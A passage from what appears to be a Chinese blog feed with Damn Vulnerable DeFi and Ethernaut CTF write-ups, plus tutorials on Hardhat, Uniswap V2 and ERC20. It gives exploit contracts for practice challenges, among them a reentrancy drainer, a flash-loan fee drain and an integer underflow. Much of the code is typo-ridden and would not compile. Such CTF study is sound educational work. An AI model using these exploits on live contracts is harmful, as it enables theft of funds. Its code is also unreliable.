class="line"></span><br><span class="line">       // pull amount + fee from receiver, then pay the fee to the recipient</span><br><span class="line">       ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee);</span><br><span class="line">       ERC20(_token).safeTransfer(feeRecipient, fee);</span><br><span class="line"></span><br><span class="line">       return true;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>revert的关键：  <code>convertToShares(totalSupply) != balanceBefore</code>，首先来看这个totalSupply,很熟悉，在ERC20中见过，又整体看这个合约，其实是继承了ERC20，totalSupply在ERC4626中定义了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//ERC4626部分合约</span><br><span class="line"></span><br><span class="line">function convertToShares(uint assets) public view virtual returns (uint256)&#123;</span><br><span class="line">    uint256 supply = totalSupply;</span><br><span class="line">    return supply = 0 ? assets : assets.mulDivDown(supply,talalAssets());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>totalAssets()：计算的是当前金库中的资产代币数目</li><li>convertToShares(totalSupply)：totalSupply 是总的 share 代币数目（只有 deposit 或 mint 时才会产生），convertToShares 就是计算：assets * totalSupply &#x2F;totalAssets ()</li></ul><p>从中我们可以看到 supply&#x3D;assets*supply&#x2F;talalAssets(),如果我们让talalAssets()总数增加，而assets不变，就能满足convertToShares(totalSupply) !&#x3D; balanceBefore，所以就只要不通过 depost 或 mint 方法向 UnstoppableVault 中转入 token 即可</p><p>方法：在<strong>Unstoppable.t.sol</strong>测试合约中写我们的攻击合约,记得找对位置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * CODE YOUR SOLUTION HERE</span><br><span class="line"> */</span><br><span class="line">function test_unstoppable() public checkSolvedByPlayer &#123;</span><br><span class="line">    vm.startPrank(player);</span><br><span class="line">    taken.transfer(address(vault),1) </span><br><span class="line">    vm.stopPrank();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH</span><br><span class="line"> */</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="Naive-receiver"><a href="#Naive-receiver" class="headerlink" title="Naive receiver"></a>Naive receiver</h2><p>要求是，掏空一个用户已经部署的合约上的ETH</p><p>分析，部署合约，pool的闪电贷手续费为1eth,receiver已经有了10eth,要使 receiver 中的余额为 0，pool 中的余额为 1000+10eth，就是因此只需通过 receiver 向 pool 执行十次闪电贷即可把 10eth 全部通过手续费的方式转给 pool</p><p>方法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;../../src/naive-receiver/FlashLoanReceiver.sol&quot;;</span><br><span class="line">import &quot;../../src/naive-receiver/NaiveReceiverLenderPool.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attacker &#123;</span><br><span class="line">    constructor(address payable _pool, address payable _receiver)&#123;</span><br><span class="line">        NaiveReceiverLenderPool pool = NaiveReceiverLenderPool(_pool);</span><br><span class="line">        for(uint256 i=0; i&lt;10; i++)&#123;</span><br><span class="line">            pool.flashLoan(IERC3156FlashBorrower(_receiver), address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE), 1, &quot;0x&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Truster"><a href="#Truster" class="headerlink" title="Truster"></a>Truster</h2><p>要求是，获取这个池中的全部DIV</p><p>分析：看整个合约，还是挺简单的，也易读易懂，flashLoan合约中，实现了简单的合约代码，执行回调的函数就是 target.functionCall(data);主要从这个入手，攻击合约如下：</p><pre><code>pragam solidityb ^0.8.0;import&quot;./TusterLenderPool.sol&quot;;import&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;interface ITusterLenderPool&#123;    function flashLoan(uint256 borrowAmount,address borrower,address target,bytes calldata data);&#125;contract TusterExploit&#123;   ITusterlenerPool cons;   address pool;   uint256 balanceof;   address tokenaddress;   constractor (address _pool,address _tokenaddress,uint256 Balanceof)   &#123;    cons = ITusterLenderPool(_pool);    pool = _pool;    tokenaddress = _tokenaddress;    balanceof = Balanceof;   &#125;   function hack() public &#123;    cons.flashLoan(0,msg.sender,tokenaddress,abi.codeWithSigner(&quot;appove(address,uint256)&quot;,address(this),balanceof));    IERC20 token  = IERC20(tokenaddress);    token.transferFrom(pool,msg.sender,balanceof);   &#125;&#125;pragma solidity ^0.8.0;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hardhat</title>
      <link href="/2024/08/06/hardhat/"/>
      <url>/2024/08/06/hardhat/</url>
      
        <content type="html"><![CDATA[<h1 id="hardhat"><a href="#hardhat" class="headerlink" title="hardhat"></a>hardhat</h1><p><strong>hardhat</strong>就是以太坊开发环境，如同remix,现在介绍一下安装<strong>hardhat</strong>的步骤</p><ul><li>打开终端，win+r,输入cmd</li><li>检查node js,安装没有，<code>node -v</code> (没有安装去官网下载)</li><li>建一个文件夹，在终端输入<code>mkdir hardhat-tutorial</code>，然后进入文件夹，<code>cd hardhat-tutorial</code></li><li>进行初始化，<code>npm init</code>，接下来一直按enter,直到出现<code>Is this OK? (yes)</code>,回答yes即可</li><li>安装<strong>hardhat</strong> <code>npm install --save-dev hardhat</code>,需要等待几秒</li><li>再安装一个插件 npm install –save-dev @nomicfoundation&#x2F;hardh<br>at-toolbox<br>s</li></ul><h2 id="编写合同"><a href="#编写合同" class="headerlink" title="编写合同"></a>编写合同</h2><p>安装完成后，因为使用VScode,所以我们要安装一个VScode 安全帽，它可以帮组我们更好的使用solidity语言，然后在VScode创建一个新目录，写一个简单的.sol合约，在终端中运行该合约，<code>npx hardhat compile,</code>成功后就会看到<code>Compiled 1 Solidity file successfully (evm target: paris).</code></p><h2 id="测试合约"><a href="#测试合约" class="headerlink" title="测试合约"></a>测试合约</h2><p><code>npx hardhat test</code>,如果你想看到solidity的日志消息，合约变量，必须导入<code>hardhat/console.sol</code>合约代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;hardhat/console.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line">  //...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再添加一些对该函数console.log的调用transfer()</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function transfer(address to, uint256 amount) external &#123;</span><br><span class="line">    require(balances[msg.sender] &gt;= amount, &quot;Not enough tokens&quot;);</span><br><span class="line"></span><br><span class="line">    console.log(</span><br><span class="line">        &quot;Transferring from %s to %s %s tokens&quot;,</span><br><span class="line">        msg.sender,</span><br><span class="line">        to,</span><br><span class="line">        amount</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    balances[msg.sender] -= amount;</span><br><span class="line">    balances[to] += amount;</span><br><span class="line"></span><br><span class="line">    emit Transfer(msg.sender, to, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结，hardhat就是能轻松部署我们的合约、运行测试和调试 Solidity 代码，无需处理实时环境，更多知识请参考<a href="https://hardhat.org/">hardhat</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> test </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Uniswap V2</title>
      <link href="/2024/08/06/uniswap-V2/"/>
      <url>/2024/08/06/uniswap-V2/</url>
      
        <content type="html"><![CDATA[<h1 id="Uniswap-V2"><a href="#Uniswap-V2" class="headerlink" title="Uniswap V2"></a>Uniswap V2</h1><p><strong>Uniswap</strong>是一种流行的去中心化交易所 (DEX)协议，允许用户将任何 ERC20 代币交换为另一种代币，提供流动性以赚取费用，并访问以太坊区块链上的价格预言机。 而Uniswap V2具有更强大的功能，如下：</p><ul><li>它允许任何的ERC20代币与其他的ERC20代币配对，无需ETH作为中介，这使得流动性池更加多样化和高效，并为交易者提供更好的价格。 就是一种代币可与其他的代币转化，方便很多</li><li>Uniswap V2 实施了一种新颖的机制，可实现高度去中心化且抗操纵的链上价格供给。 这是通过在每个区块开始时测量两种资产的相对价格并随着时间的推移积累历史数据来实现的。 这允许外部智能合约查询任何时间间隔内任何货币对的时间加权平均价格（TWAP），同时将天然气成本和预言机风险降至最低。</li><li>Uniswap V2 支持一种称为闪电互换的新型交易，用户可以从池中接收任意数量的任何资产，并在链上的其他地方使用它，只要他们在交易结束时偿还该金额并支付费用即可。 交易。 这为套利、保证金交易、抵押品互换等开辟了新的可能性。</li></ul><p>每个Uniswap智能合约或一对智能合约都管理由两个ERC-20代币的储备组成的流动资金池。</p><p>同时它也有很多好处：</p><ul><li>低费用：Uniswap V2 对每笔交易收取 0.3% 的固定费用，该费用由所有流动性提供者按其在池中的权益比例分配。 该费用低于大多数中心化交易所和其他 DEX 协议，这使得 Uniswap V2 成为中小额交易的有吸引力的选择。</li><li>高流动性：Uniswap V2 利用以太坊及其庞大的 ERC20 代币生态系统的网络效应，为任何代币对提供高流动性。 任何人都可以通过提供一定数量的两种代币来创建新的货币对或加入现有的货币对，从而增加池的深度和可用性。 此外，Uniswap V2 采用自动做市商（AMM）模型，根据供需情况调整价格，确保任何交易规模始终有足够的流动性。</li><li>无许可访问：Uniswap V2 是<strong>完全去中心化和非托管的</strong>，这意味着任何人都可以使用它，而无需注册帐户、验证身份或信任第三方使用其资金。 用户可以完全控制自己的资产，可以随时进行交易或提供流动性，而无需担心停机、审查或黑客攻击。</li><li>透明定价：Uniswap V2 采用简单透明的定价机制，由恒定乘积公式和矿池当前准备金余额决定。 用户可以轻松计算他们将收到或支付任何交易的确切代币数量，没有任何隐藏费用或滑点。 用户还可以根据池的历史数据访问任何货币对的可靠且无需信任的价格预言机。</li></ul><p>要使用Uniswap V2可在<a href="https://uniswap.org/">官网</a>上访问,可以自己创建一个Uniswap钱包，一定要记住<strong>私钥</strong></p><p>流动性提供者的结构和合约之间的交互涉及多个概念和机制，以下是详细的解释：</p><h1 id="流动性提供者的结构"><a href="#流动性提供者的结构" class="headerlink" title="流动性提供者的结构"></a>流动性提供者的结构</h1><ol><li><p><strong>流动性提供者（LP）</strong>：</p><ul><li>流动性提供者是向去中心化交易所（DEX）提供资产的用户，以便交易者可以在该平台上进行交易。</li><li>LP 将两种代币（例如 USDC 和 SAFU）存入流动性池，作为回报，他们会获得流动性池代币（LP 代币），这些代币代表他们在池中的份额。</li></ul></li><li><p><strong>流动性池</strong>：</p><ul><li>流动性池是智能合约，存储了两种代币，允许用户以自动化方式进行交易。</li><li>交易者在池中买入或卖出代币，池中的资产根据交易的供需情况进行调整。</li></ul></li><li><p><strong>流动性池代币（LP 代币）</strong>：</p><ul><li>当用户提供流动性时，会获得相应的 LP 代币，表示他们在流动性池中的份额。</li><li>LP 代币可以用于其他操作，比如质押、获取奖励或进行再投资。</li></ul></li></ol><h3 id="合约之间的交互"><a href="#合约之间的交互" class="headerlink" title="合约之间的交互"></a>合约之间的交互</h3><ol><li><p><strong>流动性添加</strong>：</p><ul><li>LP 通过调用路由合约（例如 Uniswap 的 Router 合约）进行流动性添加。</li><li>路由合约会将 LP 的代币存入流动性池合约，并铸造 LP 代币。</li></ul></li><li><p><strong>交易</strong>：</p><ul><li>当交易者进行交易时，他们通过路由合约交换代币。路由合约会调用流动性池合约来更新池中的资产。</li><li>交易的执行会根据预设的算法（如自动做市商算法）调整池中代币的比例。</li></ul></li><li><p><strong>流动性移除</strong>：</p><ul><li>LP 可以选择移除他们的流动性，通过调用路由合约并指定 LP 代币数量。</li><li>路由合约会验证 LP 代币的有效性，并将相应的基础代币返回给 LP。</li></ul></li><li><p><strong>费用和奖励</strong>：</p><ul><li>每笔交易都会产生一定的交易费用，这些费用会分配给流动性提供者，作为他们提供流动性的奖励。</li><li>LP 代币也可以用于其他合约（例如收益农场或流动性挖矿合约），进一步增加收益。</li></ul></li></ol><h3 id="示例流程"><a href="#示例流程" class="headerlink" title="示例流程"></a>示例流程</h3><p>假设一个用户（LP）希望在 Uniswap 上提供流动性：</p><ol><li><p><strong>流动性添加</strong>：</p><ul><li>用户决定存入 1000 USDC 和 1 SAFU 代币。</li><li>调用 <code>addLiquidity</code> 函数，将代币发送到 Uniswap 的 Router 合约。</li><li>Router 合约会向流动性池合约转移代币，并返回相应的 LP 代币。</li></ul></li><li><p><strong>进行交易</strong>：</p><ul><li>用户或其他人可以在 Uniswap 上进行代币交换。</li><li>Router 合约会找到最佳路径并调用流动性池合约来执行交换。</li></ul></li><li><p><strong>流动性移除</strong>：</p><ul><li>用户希望取回他们的流动性，通过调用 <code>removeLiquidity</code>。</li><li>Router 合约会验证 LP 代币，并返回用户存入的相应数量的代币。</li></ul></li><li><p><strong>获得交易费用</strong>：</p><ul><li>交易过程中产生的手续费会根据用户在流动性池中的份额自动分配给他们。</li></ul></li></ol><h3 id="攻击者如何利用这些结构"><a href="#攻击者如何利用这些结构" class="headerlink" title="攻击者如何利用这些结构"></a>攻击者如何利用这些结构</h3><p>攻击者可以利用 LP 代币的流动性和合约之间的交互来执行攻击，例如：</p><ul><li><strong>通过高频交易</strong>：利用流动性池中的不平衡，进行高频交易来获利。</li><li><strong>利用价格操控</strong>：通过添加或移除流动性来操控价格，进而影响市场。</li><li><strong>奖励套利</strong>：转移 LP 代币到其他合约（例如收益农场）以获得额外奖励。</li></ul><p>这种合约之间的交互和流动性提供者的结构使得去中心化交易所能够高效运行，但同时也为攻击者提供了潜在的攻击向量。</p><p>Uniswap V2的思考<br>Uniswap通过 x * y &#x3D; k 这个恒定乘积的等式完成了链上自动做市。当然它也有一个特别大的缺点，就是随着池中B的减少，B的价格会越来越贵，和外部的价格越来越偏离了。为了解决这种偏离，套利者会通过其连续的套利活动将差异抹到可以忽略的地步。</p><p>那么是谁在支付这些收益。</p><p>Uniswap的项目方不可能支付这些利润。他们只是提供智能合约。</p><p>其他交易者如果发现池中价格比起外部价格存在差异，理性的行为是参与套利。</p><p>那么剩下来唯一支付这些利润的就是提供流动性的做市者了。他们的损失也正是套利者为了平衡内外价格而获得的利润。因此Uniswap通过交易手续费的方式，为流动性提供者进行了补偿。</p><p>Impermanent Loss<br>流动性提供者的损失是如何产生的？</p><p>来看一个简单的例子。</p><p>假如有池子ETH:USDT，假设流动性提供者按照当时的市场价格 1 ETH&#x3D;500 DAI 提供了 20个ETH 和10000个DAI。此时LP持有的资产价值&#x3D;10000 DAI +20ETH &#x3D; 20000 DAI。</p><p>过了一段时间，外部交易所的ETH 价格变化为 1 ETH&#x3D;550 DAI，而此时我们的池子还是维持 500 DAI 的价格。这就意味着出现一个套利机会。</p><p>套利者在池中支付DAI，获得ETH，并且在外部卖出，就可以获得无风险的差价。而套利本身将让池中的ETH&#x2F;DAI价格从500上升到550，这样套利机会也就消失了。</p><p>套利者需要付出488个DAI，提取0.93个ETH 就可以让池内价格变成550。套利者的利润则是0.93*550–488&#x3D;23.5 DAI。如果我们按照外部市场价计算LP手中的代币，那么总价值会是21000 DAI。但是池内经过套利平衡后，价格虽然和外部市场价一样，单价是两种代币的比例发生了变化,，因此总价值只有20976.59。</p><p>假设如果外部市场价格再一次回到了500，那么套利者可以通过支付0.93个ETH，获取488个DAI，让池内的价格ETH和DAI又回到了期初的状态。 LP此时又回到了最初的状态，没有亏损。</p><p>总结：<br>1只要流动性池的价格偏离外部价格，套利者总是可以无风险获得收益，LP则总是出现浮动亏损，最好的情况就是不亏损。</p><p>2只要LP不退出流动性池，那么当外部市场价格回到建立池的价格时，LP依然可以保留全部资产不亏损，所以LP的亏损是一个浮动的亏损，而非实际的亏损。</p><p>3 套利活动让价格趋于一致，代价就是LP付出了套利者的利润。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ERC20</title>
      <link href="/2024/08/05/ERC20/"/>
      <url>/2024/08/05/ERC20/</url>
      
        <content type="html"><![CDATA[<h1 id="ERC20"><a href="#ERC20" class="headerlink" title="ERC20"></a>ERC20</h1><p><code>ERC20</code>是以太坊上的代币标准，它实现了代币转账的基本逻辑：</p><ul><li>账户余额(balanceOf())</li><li>转账(transfer())</li><li>授权转账(transferFrom())</li><li>授权(approve())</li><li>代币总供给(totalSupply())</li><li>授权转账额度(allowance())</li><li>代币信息（可选）：名称(name())，代号(symbol())，小数位数(decimals())</li></ul><p>除了ERC20,还有它的接口合约IERC20，就是为了统一规范，以便好使用，接下来就介绍一下IERC20合约的功能</p><h2 id="俩个事件"><a href="#俩个事件" class="headerlink" title="俩个事件"></a>俩个事件</h2><ul><li>释放条件：当 <code>value</code> 单位的货币从账户 (<code>from</code>) 转账到另一账户 (<code>to</code>)时.<br><code>event Transfer(address indexed from, address indexed to, uint256 value);</code></li><li>释放条件：当 <code>value</code> 单位的货币从账户 (<code>owner</code>) 授权给另一账户 (<code>spender</code>）时.<br><code>event Approval(address indexed owner, address indexed spender, uint256 value);</code></li></ul><h2 id="六个函数"><a href="#六个函数" class="headerlink" title="六个函数"></a>六个函数</h2><ul><li><code>totalSupply()</code>返回代币总供给<br><code>function totalSupply() external view returns (uint256);</code></li><li><code>balanceOf()</code>返回账户<code>account</code>所持有的代币数.<br><code>function balanceOf(address account) external view returns (uint256);</code></li><li><code>transfer()</code>转账 <code>amount</code> 单位代币，从调用者账户到另一账户 <code>to</code>,如果成功，返回 <code>true</code>,释放 {Transfer} 事件.<br><code>function transfer(address to, uint256 amount) external returns (bool);</code></li><li><code>allowance()</code>返回<code>owner</code>账户授权给<code>spender</code>账户的额度，默认为0,当{approve} 或 {transferFrom} 被调用时，<code>allowance</code>会改变<br><code>function allowance(address owner, address spender) external view returns (uint256);</code></li><li><code>approve()</code>调用者账户给<code>spender</code>账户授权 <code>amount</code>数量代币,如果成功，返回 <code>true</code>,释放 {Approval} 事件<br><code>function approve(address spender, uint256 amount) external returns (bool);</code></li><li><code>transferFrom()</code>通过授权机制，从<code>from</code>账户向<code>to</code>账户转账<code>amount</code>数量代币。转账的部分会从调用者的<code>allowance</code>中扣除。 如果成功，返回 <code>true</code>. 释放 {Transfer} 事件. <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> function transferFrom(</span><br><span class="line">    address from,</span><br><span class="line">    address to,</span><br><span class="line">    uint256 amount</span><br><span class="line">) external returns (bool);</span><br></pre></td></tr></table></figure>以上须记住，以便好用</li></ul><p>说白了，它就是以太坊发行代币的一个标准，学会了如何实现ERC20，对入门区块链是很有帮助的</p>]]></content>
      
      
      
        <tags>
            
            <tag> 协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ethernaut靶场题解</title>
      <link href="/2024/08/01/Ethernaut%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3/"/>
      <url>/2024/08/01/Ethernaut%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut"><a href="#Ethernaut" class="headerlink" title="Ethernaut"></a><a href="https://ethernaut.openzeppelin.com/">Ethernaut</a></h1><h2 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a>Fallback</h2><p>要求是，成为这个合约的所有者，并使这个合约的钱为零</p><p>分析;<br>从这个合约中可以看到，要成为owner<br>1，我们的钱必须大于合约持有者的钱，但是最开始合约本身就有1000ether，这个时候就走contribute函数不行，因为我们没有那么多钱<br>2，此时发现receive，只要我们的钱和合约的钱大于0，就可以成为这个合约的持有者</p><p>方法：<br>1，在remix上不能部署这个合约，因为部署后，合约初始化，owner就是我们自己了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">constructor() &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">      contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>直接使用合约地址<strong>At Adress</strong><br>2,调用contribute函数，转账1wei；<br>2,调用receive函数，转账1wei,就完成了,注意记得将钱收回来</p><hr><h2 id="Fal1out"><a href="#Fal1out" class="headerlink" title="Fal1out"></a>Fal1out</h2><p>要求是，成为这个合约的所有者</p><p>分析：<br>注意这个的solidity的版本是0.6，没有影响关系，只是构造函数的写法不一样，如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//solidity 0.8</span><br><span class="line">  constructor foo()&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">//solidity 0.6</span><br><span class="line">  function foo()&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>看与owner相关的函数，再去分析构造的合约名字Fallout，仔细发现有个Fal1out的函数，它实际上是命名错误的，这个时候我们就可以调动这个函数，刚好成为合约的所有者</p><p>方法：直接部署不行，因为里面有其他的import，所以我们就外部调用这个合约，使用接口,另创建一个合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Fallout &#123;</span><br><span class="line">    function owner() external view returns(address) //观察所有者的地址是否为我们</span><br><span class="line">    function Fal1out() external payable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Coin-Flip"><a href="#Coin-Flip" class="headerlink" title="Coin Flip"></a>Coin Flip</h2><p>要求是，连续猜对10次猜对硬币的结果</p><p>分析：就是要想办法调用flip()函数10次，让猜测的结果与side一致</p><p>方法：直接上攻击合约,在目标合约内,部署攻击合约，就是一样的调用目标合约的flip函数之后，得到的guess在进入一样的目标合约之中，这样我们的猜测值guess就与side一样了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contact Hack &#123;</span><br><span class="line">  CoinFlip private immutable target;</span><br><span class="line">  FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  constructor (address _target)&#123;</span><br><span class="line">    target = CoinFlip(_target);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function flip external &#123;</span><br><span class="line">    bool guess = _guess();</span><br><span class="line">    require(target.flip(guess),&quot;guess failed&quot;);//保证攻击合约中的guess与初始合约的side一样</span><br><span class="line">    &#125;</span><br><span class="line">  // 复制初始合约的flip()函数</span><br><span class="line">  function _guess() view returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line">    uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line">     return side;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h2><p>要求是，获得该合约的所有权</p><p>分析：代码还是挺短的，主要就是弄懂<strong>tx.origin</strong>是什么意思，<strong>tx.origin</strong>是发起交易的账户，<strong>msg.sender</strong>是当前直接调用这个合约的即时账户，只要这俩者不一样就成功了<br>详细解释：</p><ul><li>A调用B合约<ul><li>tx.origin&#x3D;A</li><li>msg.sender&#x3D;A</li></ul></li><li>A调用B合约，B合约调用C合约<ul><li>tx.origin&#x3D;A</li><li>msg.sender&#x3D;B</li></ul></li></ul><p>方法：直接调用Telephone合约，不能满足条件，所以我们要写一个攻击合约来调用Telephone合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">  constructor (address _target)&#123;</span><br><span class="line">    Telephone(_target).changeOwner(msg.sender);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_target接受Telephone的地址，我们部署Hack合约，msg.sender就是我们的地址</p><hr><h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><p>要求是，我们有20个代币，需要让代币余额增加到20以上</p><p>分析：还是看solidity版本，0.6版本没有内置Safemath,所以就可以执行溢出或者下溢的操作  </p><blockquote><p>Safemath:在Solidity 中，SafeMath是一个常用的库，用于防止整数溢出和下溢的安全数学运算工具。由于Solidity的整数类型（如 uint 和int ）是有限的，当进行加法、减法、乘法或除法运算时，如果操作结果超出了类型范围，就会导致溢出或下溢<br>如，0-1会导致下溢，就会生成最大的无符号整数，并且大于0</p></blockquote><p>方法：调用攻击合约中，再调用transfer函数，给msg.sender转账1个代币，由于攻击合约没有代币，就会发生下溢</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Token &#123;</span><br><span class="line">function balanceOf(address _) public view returns (uint256)</span><br><span class="line">function transfer(address _to, uint256 _value) public returns (bool)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">  constructor(address _target)&#123;</span><br><span class="line">   Telephone(_target).transfer(msg.sender,1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h2><p>要求是，获得这个合约的所有权</p><p>分析：理解<a href="https://wtf.academy/docs/solidity-102/Delegatecall/">delegatecall</a>,就是调用pwm函数，通过触发fallback函数，然后进行委托用</p><p>方法：部署Delegate合约，但是不调用，我们是在delegation合约上调用pwn函数</p><hr><h2 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h2><p>要求是，使这个合约的余额大于零</p><p>分析：代码还是很简单，就是一个空合约，什么函数也没有，就考虑到自毁合约的功能  </p><blockquote><p>自毁合约：自毁合约是一种智能合约，通常基于区块链技术，其设计初衷是在特定条件下自动执行某些预定的操作，最终将合约自身的功能或者存储的资产销毁。这种合约的设计可以确保在特定情况发生时，例如某个时间点到达、某个条件达成或者特定的事件发生，合约内部的资产或者代码可以被永久删除或者无法访问。</p></blockquote><p>方法：使用通过selfdestructh功能删除一个合约，合约内所有的余额将被强制发送到另一个合约，就是写一个攻击合约自毁</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">  constructor (address payable _target) payable&#123;</span><br><span class="line">      selfdestruct(_target);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署攻击合约时记得发送1wei</p><hr><h2 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h2><p>要求是，解锁保险箱</p><p>分析：password是个私有变量，不能直接获取，但是它也是个状态变量，可以访问的，通过回到ethernaut网站，在控制台获得密码即可</p><p>方法：在控制台输入 <code>await web3.eth.getStorageAt(contract.address,1)</code>, 获得密码</p><hr><h2 id="king"><a href="#king" class="headerlink" title="king"></a>king</h2><p>要求是，破坏游戏规则</p><p>分析：通过合约来看就是阻碍别人调用receive函数,拒接别人的转账,</p><p>方法：写一个攻击合约,不要有fallback,receive函数，防止新玩家转账，成为新国王</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">  constructor (address payable target) payable&#123;</span><br><span class="line">      uint prize = King(target).prize();</span><br><span class="line">      (bool ok,)=target.call&#123;value: prize&#125;(&quot;&quot;);</span><br><span class="line">      require(ok,&quot;call failed&quot;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在执行攻击合约时，首先检查当前的奖金值，然后部署攻击合约时，发送该奖金值</p><hr><h2 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h2><p>要求是：窃取合约中的所有资金</p><p>分析：这是一个典型的重入攻击  </p><blockquote><p>重入攻击：重入攻击的典型示例是以太坊的智能合约中发生的情况。以太坊的智能合约是按照以太币（ETH）的传统交易方式执行的，合约可以调用其他合约或发送ETH到外部账户。如果一个合约在调用外部合约时先转移ETH给另一个合约，并且在接收ETH后再执行其他逻辑，那么这个外部合约可以在接收ETH后调用原合约，重新执行发送ETH的逻辑，导致重复的ETH转移，从而造成资金损失。<br>通过不断调用withdraw函数,窃取资金</p></blockquote><p>方法: 写一个攻击合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier:   MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface IReentrance &#123;</span><br><span class="line">  function donate(address) public payable;</span><br><span class="line">  function withdraw(uint256) public;</span><br><span class="line">&#125;</span><br><span class="line">contract Hack &#123;</span><br><span class="line">  IReetrance private immutable target;</span><br><span class="line"></span><br><span class="line">  constructor(address _target)&#123;</span><br><span class="line">    target = IReetrance(_target);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function attack() external payable &#123;</span><br><span class="line">    target.donate&#123;value: 1e18&#125;(address(this));</span><br><span class="line">    target.withdraw(1e18);</span><br><span class="line">    require(address(target).balance == 0,&quot;target balance &gt;0&quot;);</span><br><span class="line">    selfdesctruct(paybale(msg.sender));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external paybale &#123;</span><br><span class="line">    uint prize = min(1e18,address(target).balance);</span><br><span class="line">    if(prize &gt; 0)&#123;</span><br><span class="line">    target.withdraw(prize);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function min(uint x,uint y) private pure returns(uint) &#123;</span><br><span class="line">     return x&lt;=y ? x:y;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>部署攻击合约,调用attack函数发送1ether,即可</p><hr><h2 id="Elevator"><a 